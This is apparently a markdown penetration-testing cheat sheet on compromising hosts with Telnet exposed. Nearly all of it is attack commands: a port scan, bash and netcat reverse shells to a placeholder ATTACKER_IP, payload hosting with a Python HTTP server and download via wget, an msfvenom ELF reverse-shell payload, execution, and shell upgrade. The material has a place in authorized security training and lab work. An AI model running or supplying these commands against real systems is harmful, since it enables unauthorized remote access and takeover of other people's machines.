## 1. 🕳️ Scan for Telnet Access

Check if Telnet (port 23) is open:

```bash
nmap -p 23 -sV <target-ip>
---

## 2. 📤 Sending a File Over Telnet

Telnet doesn't support file transfers directly, but you can work around that.

### Option A: Manually Echo Payload

Create a basic bash reverse shell:

```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > shell.sh
```

Use Telnet to echo it line-by-line on the target:

```bash
telnet <target-ip> 23
```

Then run:

```sh
echo '#!/bin/bash' > shell.sh
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> shell.sh
chmod +x shell.sh
```

### Option B: Transfer File with HTTP Server

On attacker machine:

```bash
python3 -m http.server 8000
```

Target (from Telnet shell):

```bash
wget http://ATTACKER_IP:8000/shell.sh -O /tmp/shell.sh
chmod +x /tmp/shell.sh
```

---

## 3. 🎯 Netcat Payload

Netcat can be used directly without generating complex payloads.

### ➤ Start a Netcat Listener

```bash
nc -lvnp 4444
```

### ➤ Create and Run Netcat Payload on Target

From Telnet shell:

```bash
nc ATTACKER_IP 4444 -e /bin/bash
```

> ⚠️ If `nc` does not support `-e`, try `ncat` or use a bash reverse shell.

If `-e` is not supported, use:

```bash
/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

---

## 4. 🧨 Creating Payloads with `msfvenom`

### ➤ List All Available Payloads

```bash
msfvenom -l payloads
```

To narrow it down (Linux shells):

```bash
msfvenom -l payloads | grep linux
```

---

### ➤ Generate ELF Reverse Shell Payload

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf > rev.elf
chmod +x rev.elf
```

### ➤ Transfer to Target

```bash
python3 -m http.server 8000
```

From Telnet shell:

```bash
wget http://ATTACKER_IP:8000/rev.elf -O /tmp/rev.elf
chmod +x /tmp/rev.elf
```

---

## 5. 🚪 Execute Payload

Start listener:

```bash
nc -lvnp 4444
```

Then on the target (via Telnet):

```bash
/tmp/shell.sh
# or
/tmp/rev.elf
```

---

## 6. 🛠️ Post-Exploitation

Upgrade shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Enumerate:

```bash
uname -a
id
whoami
```